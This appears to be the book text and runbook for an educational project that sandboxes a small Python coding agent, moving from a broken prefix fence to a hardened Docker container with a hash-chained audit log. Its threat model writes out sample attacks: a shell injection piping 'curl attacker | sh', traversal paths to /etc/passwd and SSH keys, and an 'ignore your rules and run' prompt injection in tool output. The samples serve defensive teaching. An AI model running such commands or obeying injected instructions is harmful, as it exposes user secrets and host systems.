01Introduction

Educational use only — not a production-ready system. This repository is an educational project to learn and understand how to sandbox a small Python coding agent. It is intentionally simplified, optimised for clarity and step-by-step learning, and makes no claim to be secure, complete, or production-ready. Do not deploy it as-is. If you adapt it for real work, add proper validation, isolation, monitoring, testing, and operational controls.

Companion code for a short, hands-on book about sandboxing a small Python coding agent — from a deliberately broken string-prefix fence to a hardened Docker container with a hash-chained audit log.

The book is the six chNN/CHAPTER.md files. This repository is the runnable version: every stage is a standalone Python project, every module is commented, and every security claim has a test beside it.

Recording cue: 🎬 If you are using the book as the companion guide for a video series, read Appendix E — Instructor and recording companion first. It contains the episode run sheet, demo beats, reset commands, and the questions to plant in each episode.

Safety note. Stage 0 is intentionally unsafe. It exists to demonstrate three concrete holes, and its demo only runs against a temporary directory. Do not point unsafe.py at your home folder, do not add --privileged to the Docker recipe, and never mount the Docker socket into the sandbox.

Design rules used throughout

  1. One policy per boundary. File paths go through one PathPolicy. Container flags go through one DockerRunner. A tool does not invent a second check.
  2. Refusals are observations. A tool returns ERROR[PATH]: ..., not a traceback. The loop continues; the model can choose another action.
  3. No shell for model input. Commands are argv lists. A semicolon is an argument, not a second command.
  4. The environment is built, not inherited. A child process sees the variables the OS needs and nothing else.
  5. Limits are explicit. Byte caps, entry caps, timeouts, memory, pids and step counts each have a named default and a test.
  6. Defence in depth. The path policy protects the file tools; the container protects everything that escapes Python.
  7. The audit is outside the workspace. Tools cannot edit their own trail through the sandbox, and the hash chain makes edits visible.
  8. The step limit is in the loop. A model may loop forever; the harness may not.

02Chapter 0 — Stage 0: The naive fence

Educational use only — not a production-ready system. This chapter is part of an educational project to learn and understand. It deliberately simplifies design, error handling, security, and operations so the core idea stays visible. Do not deploy this code as-is.

Book: Stage 0, "The naive fence" Plan: Stage 0 Goal: Build the smallest possible tool surface, then prove that its sandbox is not a sandbox.

The shape we are building

A coding agent is a loop:

The interesting part for this book is the arrow between tool call and observation. A tool is where model text becomes an operating-system action: a file read, a file write, a process start. Everything else is conversation. Sandboxing is the set of decisions that controls that arrow.

Recording cue: 🎬 Open with the three-line prefix check, not the theory. Ask the viewer to spot the flaw before you name it. The answer lands harder after a pause than after a definition.

Stage 0 deliberately makes the wrong decisions, because they are the ones a first prototype usually makes:

  • join the requested path to a workspace root;
  • check that the result starts with the root as a string;
  • run commands through the platform shell;
  • inherit the parent environment;
  • trust the model not to ask for anything strange.

Each of those choices looks reasonable in a demo. Each has a concrete failure.

What changed

  • Added mini_harness/unsafe.py with read_file, list_files and run_shell.
  • Added mini_harness/demo.py, which builds a throwaway lab and shows the holes.
  • Added tests/test_unsafe.py, which asserts the bad outcomes so the threat model is executable.

The three holes

1. A prefix check is not a containment check

/tmp/workspace-evil starts with /tmp/workspace. A sibling folder therefore passes the fence. The check compares spellings, not filesystem identities.

2. A symlink is inside the workspace by name and outside by target

The string workspace/innocent-link.txt starts with workspace, so the check passes. The kernel follows the link and opens the key. os.path.abspath does not resolve symlinks; it only collapses . and ...

3. A shell is not a command runner

This gives one tool call the power to become many commands. It also inherits every secret in the parent environment, has no wall-clock limit, captures unbounded output in memory, and applies no CPU, memory or file-size limit.

The tests keep the shell command harmless (echo hello). The point is the shape of the call, not a destructive example. Never point Stage 0 at a real home directory.

Why keep the broken code?

Because "we will add security later" is easier to resist when the first version comes with a failing threat model. The tests are not celebrating the holes; they are pinning them down. Chapter 1 replaces the expectations with the opposite ones: the escape must be refused.

A second reason is pedagogical: the fixed version is easier to trust when you have seen the exact input that broke the naive version.

Audience question: 🗣️ "If the path starts with the workspace folder, is it inside the workspace?" Pause, then show workspace-evil. That one example carries the entire episode.

Edit note: ✂️ If the symlink case skips on Windows, record the skip once, explain Developer Mode, and move on. Do not spend the take fighting the OS.

Stage limits

  • No real path policy.
  • No size limits.
  • No command allowlist, timeout or output cap.
  • No audit trail.
  • The demo is intentionally unsafe; do not reuse unsafe.py.

If it goes wrong

  • **The demo blocks plain ../ and nothing else** — that is correct for this stage. The string check catches the obvious spelling.
  • The symlink case skips — Windows needs Developer Mode or an elevated process to create symlinks. The prefix-sibling case still demonstrates the class of bug.
  • A test fails because echo is missing — the demo uses the platform shell; echo is available in both cmd.exe and POSIX shells. If your environment is unusual, replace it with python -c "print('hello')" in run_shell.

03Chapter 1 — Stage 1: One path policy

Educational use only — not a production-ready system. This chapter is part of an educational project to learn and understand. It deliberately simplifies design, error handling, security, and operations so the core idea stays visible. Do not deploy this code as-is.

Book: Stage 1, "One path policy" Plan: Stage 1 Goal: Replace the string-prefix fence with one object that resolves real paths and answers the same question for every tool.

The problem

The naive fence fails because it asks "does this path look like it is inside the workspace?" The kernel asks "which file will this path open?" Those are different questions, and only the second one matters.

Recording cue: 🎬 Put that pair of questions on a slide and leave it up for the whole explanation. Every mechanism in this chapter is an answer to the second question.

There are three layers to get right:

  1. Lexical normalisation. Collapse . and ..; reject NUL bytes, control characters, UNC paths and drive-relative forms.
  2. Symlink resolution. Follow every link in the longest existing prefix, then reattach the part that does not exist yet.
  3. Containment. Compare canonical paths with a real common-path check, not startswith.

Stage 1 puts all three in mini_harness/path_policy.py. It contains no file-content logic. It only answers where a path points.

What changed

  • Added mini_harness/path_policy.py with PathPolicy, PolicyError and ResolvedPath.
  • Added mini_harness/demo.py, which exercises allowed and refused names.
  • Added tests/test_path_policy.py with 25 cases covering the platform edges.

The central algorithm

Resolve the deepest existing ancestor

A write target often does not exist yet:

os.path.realpath only resolves what is on disk. If the whole path is missing, it cannot tell you that workspace/link-to-outside is a symlinked parent.

_realpath_best walks upward until it finds something that exists, resolves that prefix, then reattaches the missing components:

This catches the important case:

The new.txt does not exist, but its parent does. Resolving the parent proves that the canonical target is outside the workspace.

Compare real paths with commonpath

commonpath understands path boundaries. On Windows it raises ValueError for paths on different drives; that is a refusal, not a crash. normcase lowercases on Windows so case-insensitive filesystems compare correctly.

Reads and writes differ on purpose

Reads may be absolute as long as the resolved file is inside the root. A developer may want to read a file by its full path. Writes must be relative: a write should be an intentional workspace action, not an absolute overwrite of a system file.

Writes also refuse a final symlink. The atomic writer in Stage 2 would replace the link rather than follow it, but other tools may not. Refusing at the policy layer makes the rule independent of the tool.

Platform spellings are normalised before validation

The policy treats \ as a separator on every platform. On POSIX, ..\secret would otherwise be a legal (but bizarre) filename. Normalising it makes the answer the same everywhere: that is traversal, and it is refused.

The policy also rejects:

  • C:foo — drive-relative, not drive-absolute;
  • \\server\share — UNC;
  • CON, NUL, LPT1.log — Windows device names;
  • file.txt:stream — an NTFS alternate data stream (colon-bearing names are refused);
  • trailing dots and spaces on Windows — the OS may strip them, so two different strings can name the same file;
  • control characters, especially NUL.

Stage limits

  • The policy is not a jail. A Python process running as the same user can still open files directly with os.open, race a check, or read /proc.
  • The policy does not cap file sizes; Stage 2 adds that.
  • The policy does not audit refusals; Stage 5 adds that.
  • realpath + open is still a time-of-check/time-of-use gap. The only full answer is a separate security boundary (Stage 4).

Alert: ⚠️ Do not call this chapter a jail. It is one policy, applied consistently. The kernel still lets the same user open files directly, and a determined race is out of scope until the container arrives.

If it goes wrong

  • A symlink test skips on Windows — enable Developer Mode or run elevated, or accept the skip. The prefix-sibling and traversal tests still exercise the containment logic.
  • **resolve_read("C:/x") behaves differently on POSIX** — drive-absolute paths are refused on non-Windows because they would be interpreted as a relative name containing a colon. This is intentional.
  • **A path with .. gets a reserved-name error** — make sure . and .. are skipped by the reserved-name check and handled by normalisation. The tests cover this.
  • A write to a new nested path is refused — check that _realpath_best reattaches the missing tail after resolving the parent. Stage 2's _ensure_parent creates those folders.

04Chapter 2 — Stage 2: The sandbox object and file tools

Educational use only — not a production-ready system. This chapter is part of an educational project to learn and understand. It deliberately simplifies design, error handling, security, and operations so the core idea stays visible. Do not deploy this code as-is.

Book: Stage 2, "The sandbox object and file tools" Plan: Stage 2 Goal: Put every file operation behind one object with size limits, atomic writes and a stable error vocabulary.

The problem

A path policy is necessary but not sufficient. Even a correctly resolved path can be used badly:

  • reading a 2 GB file into the model's context;
  • listing a directory with a million entries;
  • writing a file in place, so a crash leaves half a file;
  • following a symlink for a write that the policy only checked marginally;
  • raising a Python exception that unwinds the agent loop.

Stage 2 turns the policy into a sandbox contract. The policy still answers "where"; the sandbox answers "how much, how safely, and what does the caller see when it is refused?"

Recording cue: 🎬 Open with the four failure modes as a list, not with the code. The viewer should feel the problem before seeing Limits(...).

What changed

  • Added mini_harness/sandbox.py with Sandbox, Limits, DirEntry and SandboxError.
  • Added mini_harness/file_tools.py with the model-facing tool contract and run_tool.
  • Added mini_harness/demo.py and tests/test_sandbox.py.

The contract

Limits

These are policy choices, not security boundaries. They protect the agent process from a tool result that is too large to handle. A model can still ask for a small file many times; the loop's step limit and the operator's rate limits are the answer to that.

Reads are byte-bounded

read_text checks stat().st_size before opening. It then reads bytes and decodes UTF-8 with errors="replace". Reading bytes:

  • applies the limit to exactly the data received;
  • avoids newline translation, so an edit round-trip preserves \r\n;
  • avoids crashing on one stray non-UTF-8 byte.

Writes are atomic

The writer creates a temporary file in the same directory, writes and flushes it, calls os.fsync, then os.replaces it over the target. A reader sees the old file or the new file, never a half-written one. The temporary file is removed on failure.

The parent folders are created one component at a time, and the policy is re-run after each mkdir. That does not eliminate a determined race, but it catches a symlink planted between the first check and the write. The real fix for a hostile local user is the container in Stage 4.

Edits are unique by default

edit_text(path, old, new) refuses when old appears zero times or more than once. A silent replace of three identical snippets is a classic way for an agent to corrupt code. Passing count=0 means "replace all" and is an explicit opt-in.

Deletes are file-only

delete_file refuses directories and non-regular files. Recursive delete is a much larger blast radius than one file, and an agent can always ask for files one at a time. A symlink is refused by the policy before this method sees it.

Errors become observations

Tools return strings, not exceptions:

run_tool catches SandboxError, KeyError-style argument mistakes and unexpected exceptions. A bug in a tool is labelled INTERNAL and does not kill the session. The traceback belongs in the server log, not in the model's context.

It works when

  • [ ] read_text returns the file, preserves \r\n, and refuses a directory.
  • [ ] A read over the limit returns TOO_LARGE.
  • [ ] A write creates missing parent folders.
  • [ ] A write leaves no .sandbox-*.tmp file behind.
  • [ ] overwrite=False returns EXISTS instead of clobbering.
  • [ ] An edit with missing or repeated old text returns NO_MATCH or AMBIGUOUS.
  • [ ] A delete of a folder returns IS_DIR.
  • [ ] An escape returns ERROR[PATH], not a traceback.
  • [ ] The symlink-write test skips on a machine that cannot create symlinks.

Stage limits

  • Still the same user on the same kernel. A command tool would be able to bypass the sandbox entirely.
  • Still a time-of-check/time-of-use gap between policy and open.
  • No command execution yet.
  • No audit trail yet.

Alert: ⚠️ These limits protect the agent process from oversized results. They do not protect the host from a command. Stage 3 adds a runner, and Stage 4 makes the runner live behind a real boundary.

If it goes wrong

  • An edit changes the wrong text — check that the unique-match default is active and that count=0 is only used deliberately.
  • A write succeeds but the file is empty — check that the temp file is flushed and fsynced before os.replace, and that the bytes are written before the handle closes.
  • A new nested path fails — _ensure_parent walks relative_to(root) and creates each missing component. A parent that is a file returns NOT_DIR.
  • Windows says the temp file is in use — an open handle usually means the writer raised before os.replace. The cleanup path removes it; check the IO message for the underlying error.
  • A symlink read looks like a normal file — that is correct: reading through a symlink is allowed when the resolved target is inside the root. A write through a final symlink is refused.

CommandRunner.run("python", ["-c", "print('hi')"]) takes a program and a list of arguments. Passing a single string is rejected. There is no shell=True path in the runner.

A semicolon inside an argument is an ordinary character:

There is no second command to start.

2. An absolute-path allowlist

CommandPolicy maps a logical name to an absolute executable:

The runner does not use shutil.which for model-supplied names. A file called python dropped into the workspace cannot shadow the interpreter through PATH. The allowlist is checked again at call time; a missing executable is an IO error, not a fallback to PATH.

3. A clean environment

_clean_environment starts from an empty dict and adds only:

  • OS-essential variables (SYSTEMROOT, WINDIR, COMSPEC, PATHEXT, LANG, LC_ALL);
  • a minimal PATH;
  • workspace-local HOME, TMP and TEMP;
  • deterministic Python flags.

A sentinel secret in the parent environment does not appear in the child. The test asserts that directly.

4. A timeout with a process-tree kill

The child is started in a new session (POSIX) or a new process group (Windows). On timeout the runner kills the group:

  • POSIX: os.killpg(os.getpgid(pid), SIGKILL);
  • Windows: taskkill /F /T /PID.

Killing only the direct child would leave grandchildren running.

5. Output caps that still drain

Two background threads read stdout and stderr in 8 KiB chunks. Once the cap is reached the bytes are discarded but the pipe keeps being read. If the parent stopped reading, the child would block on a full pipe and never exit, turning an output limit into a hang.

The observation always says when output was truncated.

6. POSIX resource limits

Before exec, the child lowers:

  • RLIMIT_CPU — CPU seconds;
  • RLIMIT_AS — address space;
  • RLIMIT_FSIZE — maximum file size;
  • RLIMIT_NOFILE — open file descriptors;
  • RLIMIT_NPROC — process count (where supported).

Failures are swallowed: an unsupported limit should not stop a legitimate command. On Windows there is no Python-level equivalent here; the book uses container limits in Stage 4 instead. Do not pretend the local runner is equivalent on both platforms.

7. A workspace-relative working directory

cwd goes through the same path policy as reads. The model cannot ask to run from the user's home folder. A missing or non-directory cwd is a CWD refusal.

06Chapter 4 — Stage 4: Docker as the real wall

Educational use only — not a production-ready system. This chapter is part of an educational project to learn and understand. It deliberately simplifies design, error handling, security, and operations so the core idea stays visible. Do not deploy this code as-is.

The problem

Stage 3 is good hygiene, not a boundary. The local runner and the agent run as the same user on the same kernel. A command can read the user's SSH keys, write to the user's home folder, or open a network connection. Timeouts and rlimits limit how much damage happens; they do not decide what is reachable.

The audit log

3. Trust boundaries

Boundaries:

  1. Model text to tool arguments. Validate shape, types, lengths and names.
  2. Tool arguments to filesystem paths. Resolve and contain real paths.
  3. Tool arguments to process argv. No shell, allowlist the program.
  4. Process to host. Container namespaces, cgroups, capabilities, seccomp.
  5. Harness to audit. Append-only chain outside the writable workspace.

4. Threats and controls

T1 — Path traversal

Attack: ../../etc/passwd, ..\..\Users\me\.ssh\id_rsa, encoded or repeated separators.

Control: PathPolicy normalises separators, collapses . and .., and checks containment against canonical paths. Tests: ch01 traversal cases.

Residual: A same-user process can bypass Python entirely. The container is the answer for command execution.

T2 — Prefix-sibling escape

Attack: workspace /tmp/ws, target /tmp/ws-evil/secret.

Control: os.path.commonpath on canonical paths, not startswith. Tests: ch00 asserts the bug; ch01 asserts the refusal.

T3 — Symlink escape

Attack: plant workspace/link -> /home/me/.ssh, then read or write through it.

Control: resolve the deepest existing ancestor with realpath, then reattach the missing tail; re-check containment; refuse writes through a final symlink. Tests: ch01 and ch02, skipped when the OS cannot create links.

Residual: A time-of-check/time-of-use race between realpath and open. The sandbox is policy, not a kernel boundary.

T4 — Windows-specific path confusion

Attack: C:foo drive-relative paths, UNC paths, CON/NUL device names, trailing dots or spaces, NTFS alternate data streams.

Control: reject drive-relative and UNC forms; reject reserved names; reject colon-bearing/alternate-data-stream names; reject control characters; normalise separators; compare case-insensitively on Windows. Tests: ch01.

Residual: The policy does not parse every Windows path form; unusual device paths or filesystem features should be handled by the host policy and the container boundary.

T5 — Shell injection

Attack: python -c "..." ; curl attacker | sh, &&, pipes, command substitution.

Control: argv lists only; no shell=True for model input. A semicolon is an argument. Tests: ch03 shell-semantics case.

Residual: An allowlisted program can still spawn helpers. The container limits what those helpers can reach.

T6 — Environment leakage

Attack: read OPENROUTER_API_KEY, proxy credentials or cloud tokens from the inherited environment.

Control: build a minimal environment from OS-essential keys plus workspace-local HOME/TMP; do not pass the host environment. Tests: ch03 and ch04.

Residual: A secret deliberately placed in the new environment is visible to the child. Do not add secrets to the tool environment.

T7 — Resource exhaustion

Attack: allocate memory forever, fork bomb, fill the disk, print gigabytes, open thousands of files, sleep forever.

Control: byte caps and entry caps (ch02); timeout, process-tree kill, output caps and POSIX rlimits (ch03); container memory, swap, CPU, pids and nofile limits (ch04); a hard max_steps (ch05).

Residual: The local runner’s Windows path has no rlimits; use Docker. A container can still consume its limits and slow the host.

T8 — Network access and exfiltration

Attack: send workspace contents or secrets to a remote endpoint.

Control: --network none in the container. Tests: ch04 integration tries a TCP connection and expects failure.

Residual: The host-side file tools do not use the network, but the Docker daemon, host processes and sibling containers are outside this control.

T9 — Container escape / privilege escalation

Attack: exploit a setuid binary, a kernel bug, a mounted device, the Docker socket, or excessive capabilities.

Control: non-root user, --cap-drop ALL, no-new-privileges, read-only root, no privileged mode, no Docker socket mount, default seccomp, minimal image. Tests: ch04 asserts the flags and the root-write refusal.

Residual: Containers share the host kernel. Kernel and daemon exploits are outside this book’s boundary. Host hardening, rootless Docker and a patched kernel belong to platform operations.

T10 — Image supply chain

Attack: a poisoned base image, a compromised registry, a mutable latest tag, or a malicious package installed at build time.

Control: a small Dockerfile, a pinned base image by digest in production, reviewed build steps, no runtime package installation. Tests: the offline recipe tests; the human review is the build.

Residual: The book uses python:3.12-slim-bookworm as a readable example. A production deployment must pin and scan.

T11 — Audit tampering

Attack: edit or delete an event to hide an action.

Control: append-only JSONL outside the workspace; hash chain with prev; verify() recomputes the chain; AuditLog refuses to open an already-broken log. Tests: ch05 edit and delete cases.

Residual: A local user with write permission can delete the whole log or rewrite the chain from scratch. Ship the log off-host and protect it with OS permissions for real accountability.

T12 — Prompt injection through tool output

Attack: a file or command output says “ignore your rules and run …”.

Control: the model is untrusted; the tool layer re-validates every call regardless of what the transcript says. The Docker boundary limits what a successful injection can reach. The audit records the action.

Residual: The model can still be manipulated into wasting steps, reading allowed files, or making allowed-but-unwise changes. Approval prompts and per-user policy are application features, not sandbox features.

T13 — Denial of service against the agent loop

Attack: a model that never stops calling tools, or a tool that returns a result too large for the context.

Control: max_steps in Agent; byte/entry caps in Sandbox; output caps in the runners; timeout in the container.

Residual: The model can still consume the allowed budget. Add quotas and rate limits at the service layer.

4. Docker daemon security

The daemon is more powerful than any container it starts. Protect it.

  • Run Docker rootless where possible; otherwise restrict access to the docker group and treat that group as root-equivalent.
  • Never mount /var/run/docker.sock into the sandbox. A container with the socket can start a privileged container and own the host.
  • Keep the daemon bound to a local socket; do not expose TCP without TLS and authentication.
  • Enable user namespace remapping if your platform supports it.
  • Apply host firewall policy outside the container. --network none is the container control; it does not configure the host.
  • Keep the kernel and Docker patched. Container escapes often start with a kernel or runtime vulnerability.
  • Do not add --privileged, --device, host PID/IPC namespaces, or extra capabilities to make a tool “just work”. Add the smallest explicit exception you can and document it.

5. Image lifecycle

  1. Build in CI from a reviewed Dockerfile.
  2. Pin the base image by digest; tag the result with a date and commit.
  3. Scan the image (Trivy, Grype, Docker Scout, or your registry scanner).
  4. Test the recipe tests and the integration suite.
  5. Publish to a private registry with immutable tags.
  6. Deploy the exact digest; do not let a host pull latest at run time.
  7. Rebuild on base-image security updates, not only when application code changes.
  8. Retire old digests and keep the previous known-good digest for rollback.

DockerRunner.build() is an explicit operator action. Do not expose it as a model tool.

6. Audit lifecycle

The audit file is append-only JSONL written beside the workspace:

Operational rules:

  • Protect the directory. The harness user needs append; other users should not have write access. The audit is outside the sandbox but not outside the host.
  • Ship it off-host. Use a log agent with read-only access. Do not let the agent process rewrite or truncate the file.
  • Rotate by segment, not by editing. Stop the process, move the file, start a new one. The chain restarts at sequence 1 for the new file; keep the segment boundary in the shipper.
  • Verify on ingest. Recompute the chain in the log store; alert on a gap.
  • Retention. Decide how long task transcripts and audit events are kept. They may contain source code and user data even after redaction.
  • Redaction is not classification. api_key, token, secret, password and credential keys are masked, but arbitrary content can still contain sensitive data. Treat logs accordingly.

Audit verification

AuditLog refuses to open a log that is already broken. That is intentional: do not “fix” the file to make the check pass.

7. Monitoring and alerts

Alert on:

  • a rising rate of ERROR[PATH], ERROR[DENIED], ERROR[CWD] or ERROR[DOCKER_MISSING] observations (possible probing or misconfiguration);
  • timeouts and output truncation (limits too tight or a runaway command);
  • audit chain verification failures;
  • Docker daemon restarts, image pull failures, and disk pressure;
  • container removal failures after timeouts;
  • repeated agent.max_steps stops (prompt or tool-contract issue).

Dashboards should separate refusals (the sandbox working) from failures (the sandbox or infrastructure broken). A refusal spike is not automatically an incident; a dropped audit event is.

8. Incident response

Suspected sandbox escape or host compromise

  1. Stop new work. Disable the agent’s task intake; do not just ask the model to stop.
  2. Isolate the host. Remove it from the network / stop the Docker daemon if the blast radius is unknown.
  3. Preserve evidence. Copy the audit log and container logs; do not edit the audit file.
  4. Identify the boundary that failed. Path policy? Docker flag? Image? Daemon? Host kernel?
  5. Rotate secrets that were present in the environment or reachable from the host filesystem.
  6. Patch and retest the specific control; add a regression test before re-enabling.
  7. Review other hosts with the same image/daemon configuration.

Audit chain failure

  1. Treat the log as untrusted.
  2. Compare the last verified event with the log shipper’s copy.
  3. Check file permissions, disk errors and process crashes before assuming malicious tampering.
  4. Preserve the broken segment; start a new one only after the investigation.

Runaway container

  1. docker ps to find the named container (mini-harness-*).
  2. docker rm -f <name>.
  3. Check the audit for the tool.call without a matching tool.result.
  4. Inspect DockerRunner timeout and --stop-timeout settings.
  5. Lower the per-command timeout or memory limit if the task does not need it.

9. Kill switch

The minimum viable kill switch is:

  • stop accepting new tasks in the application;
  • stop the Docker daemon or deny the harness user access to it;
  • revoke the API key the model adapter uses;
  • preserve the audit log.

Do not rely on a prompt instruction (“stop using tools”). The model is not a security control.

10. Windows and macOS notes

  • Windows needs Developer Mode or elevation to create symlinks; the path tests skip otherwise. POSIX RLIMIT_* tests skip. Docker Desktop runs Linux containers in a VM; the host file sharing layer matters for workspace permissions.
  • macOS has POSIX rlimits and symlinks; Docker Desktop also runs a VM. File sharing performance and permission mapping are host-specific.
  • Linux is the closest match to the book’s container assumptions. Use a non-root user, rootless Docker if possible, and a workspace owned by a uid that matches the container --user.

11. Capacity planning

Each concurrent agent run needs:

  • one Python process (the harness);
  • one docker run client process;
  • one container (memory + CPU + pids);
  • one audit append stream;
  • workspace disk for edits and container scratch in tmpfs.

Size the host for the sum of container limits, not the average. A 256 MiB limit per container is small, but 100 concurrent runs are 25 GiB before the harness and the page cache.

12. Change control checklist

Before merging a change to any boundary:

  • [ ] The threat model entry is updated.
  • [ ] A test fails without the change and passes with it.
  • [ ] The default is the safe option.
  • [ ] The refusal is still an observation string.
  • [ ] The audit event is still written outside the workspace.
  • [ ] The Docker recipe still has every hardening flag.
  • [ ] Windows/POSIX differences are documented.
  • [ ] The operator runbook still matches the flags and defaults.

Episode 0 — The naive fence

Open with the bug, not the theory. Show the three-line prefix check and ask the audience to spot the flaw before you explain it.

Demo beats:

Show on screen: the [leaked] prefix-sibling result and the [blocked] plain traversal result. If the symlink case skips on Windows, say why.

Talking points:

  • startswith compares spellings, not filesystem identities.
  • abspath collapses . and ..; it does not resolve symlinks.
  • shell=True turns one request into a small program.
  • The tests assert the bad outcomes so the failure is reproducible.

Audience question: 🗣️ "If the path starts with the workspace folder, is it inside the workspace?" Pause. Then show workspace-evil.

Alert: ⚠️ Never run the Stage 0 shell demo against your real home folder. Keep the harmless echo example. The point is the shape of the call.

Episode 1 — One path policy

Open with the question: "Which file will the kernel actually open?" That is the whole chapter.

Demo beats:

Show on screen: a normal read, a traversal refusal, and the prefix-sibling refusal, all through the same PathPolicy.

Diagram: requested path -> lexical normalise -> resolve deepest existing ancestor -> compare real paths -> allow or refuse.

Talking points:

  • One policy for every tool; no tool invents a second check.
  • Reads may be absolute inside the root; writes must be relative.
  • commonpath understands boundaries; startswith does not.
  • The TOCTOU gap remains, and Stage 4 is the real answer.

Pro tip: 💡 Put the commonpath comparison on screen as a single code block. Do not scroll through the whole module while explaining it.

Episode 2 — The sandbox and file tools

Open with the failure modes: a 2 GB read, a million-entry directory, a half-written file, a silent replace of three identical snippets.

Demo beats:

Show on screen: one successful write, then TOO_LARGE, EXISTS, AMBIGUOUS, and PATH observations. Point out that no traceback reaches the model.

Talking points:

  • Limits protect the agent process, not the host kernel.
  • Atomic write: temp file in the same directory, fsync, replace.
  • Edit is unique by default; count=0 is an explicit opt-in.
  • Delete is file-only; recursive delete is a different blast radius.
  • Errors are observations, so the loop can continue.

Audience question: 🗣️ "Why not just catch the exception and return it?" Answer: a traceback is noise in the model's context and can leak host paths. A stable error code is a contract.

Edit note: ✂️ The symlink-write test can skip on Windows. Record the skip once, explain it, and move on. Do not fight the OS on camera.

Episode 3 — Running code locally

Open with the one-liner everyone writes: subprocess.run(user_string, shell=True). Then list what that single line gives the model.

Demo beats:

Show on screen: argv refusal, clean-environment sentinel, timeout kill, and the final honest demo where the child reads a file outside the workspace.

Talking points:

  • Argv, not a string: a semicolon is an argument, not a second command.
  • Absolute-path allowlist; do not use shutil.which for model input.
  • Clean environment: build it, do not inherit it.
  • Timeout kills the process tree, not just the direct child.
  • Output caps must keep draining the pipe or the child hangs.
  • POSIX rlimits are not portable; Docker is the portable boundary.

Recording cue: 🎬 End the episode on the outside-read result. Say: "That is not a bug in Stage 3. That is the reason Stage 4 exists." Cut to black.

Alert: ⚠️ Do not claim the local runner is a sandbox. Call it hygiene, a guardrail, or accident prevention. The chapter says this explicitly; keep the video consistent with it.

Episode 4 — Docker as the real wall

Open with the threat Stage 3 cannot stop: the child process can read the user's SSH keys and open a network connection.

Pre-record: start Docker Desktop and build the image before the take.

Show on screen: the full docker run argv, then the four live behaviours: Python runs, network fails, root write fails, workspace is visible.

Talking points:

  • Every flag in the run contract is a deliberate decision with a test.
  • --read-only freezes the image, not the workspace bind mount.
  • --network none, --cap-drop ALL, and no-new-privileges remove easy exits.
  • Timeout cleanup needs docker rm -f; killing the CLI is not enough.
  • The container shares the host kernel. It is a boundary, not magic.

Pro tip: 💡 Put the flag table on screen as an overlay while the command runs. Pause on the four or five flags that matter most; do not read all of them aloud.

Alert: ⚠️ Never mount the Docker socket into the sandbox, never add --privileged, and do not show a command that writes to the host outside the workspace.

Episode 5 — The finished harness

Open with the missing piece: we have boundaries but no agent loop and no record of what happened.

Demo beats:

Show on screen: the write, the read, the container run, the final answer, and audit chain verifies: True. Then show the audit JSONL and point at seq, prev, and hash.

Talking points:

  • The toolbox routes; it does not invent a second policy.
  • The step limit lives in the loop, not in the model.
  • A refusal is an observation; infrastructure absence still ends the loop.
  • The audit is append-only, hash-chained, outside the workspace, and redacted.
  • Tampering breaks verify(); the chain makes it visible, not impossible.

Audience question: 🗣️ "Why not let the model decide when to stop?" Answer: a model may loop forever; the harness may not.

Recording cue: 🎬 Close the series on the audit line, then a title card: "The boundary is the product." Keep the final take under 20 seconds.

Editing notes

  • Keep the failure. A refusal or a failed test is the lesson, not a blooper.
  • Cut installation and setup. Put prerequisites in the description and a pinned comment.
  • Show the command before the output. Let the viewer predict the result.
  • Zoom on one line at a time. Do not show a whole module for a single idea.
  • Use chapter cards, not hard cuts. A two-second card with the stage number and boundary makes the series easier to follow.
  • Caption code on screen. Add the exact command to the lower third when the terminal is small.
